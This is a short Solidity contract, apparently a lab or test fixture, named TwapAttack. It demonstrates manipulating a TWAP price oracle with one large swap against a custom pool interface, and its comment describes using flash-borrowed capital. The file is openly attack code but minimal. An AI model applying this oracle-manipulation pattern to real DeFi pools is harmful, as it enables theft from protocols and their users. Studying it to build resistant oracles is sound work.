
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

interface ITwap {
    function sync() external;
    function swap1To0(uint256 amountIn) external;
    function consult(address token, uint256 amountIn) external view returns (uint256);
}

interface IERC20 {
    function approve(address spender, uint256 amount) external returns (bool);
}

/// @notice TWAP oracle manipulation: one large swap (flash-borrowed capital)
///         dominates the short observation window and moves the TWAP.
contract TwapAttack {
    ITwap public pool;
    IERC20 public token1;

    constructor(address _pool, address _token1) {
        pool = ITwap(_pool);
        token1 = IERC20(_token1);
    }

    function attack(uint256 amountIn) external {
        token1.approve(address(pool), amountIn);
        pool.swap1To0(amountIn);
    }
}
